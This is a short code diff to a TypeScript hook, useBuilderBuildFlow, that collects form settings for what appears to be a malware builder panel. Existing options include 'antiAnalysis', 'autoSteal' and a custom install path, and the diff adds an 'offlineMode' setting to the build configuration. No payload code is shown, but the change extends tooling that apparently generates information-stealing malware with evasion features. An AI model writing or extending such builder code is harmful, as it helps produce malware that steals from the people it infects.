@@ -133,6 +133,9 @@ export function useBuilderBuildFlow(opts: {
       const antiAnalysis = String(antiAnalysisEl?.value || "None");
       const autoSteal = String(autoStealEl?.value || "Once");
 
+      const offlineModeEl = document.getElementById("offlineMode") as HTMLSelectElement | null;
+      const offlineMode = String(offlineModeEl?.value || "Enabled") === "Enabled";
+
       const delaySec = (() => {
          const n = parseInt(String(delay || 0), 10);
          if (!Number.isFinite(n)) return 0;
@@ -170,6 +173,7 @@ export function useBuilderBuildFlow(opts: {
             customInstallPath: installPath,
             antiAnalysis,
             autoSteal,
+            offlineMode,
          });
 
          saveActiveBuild(login, {
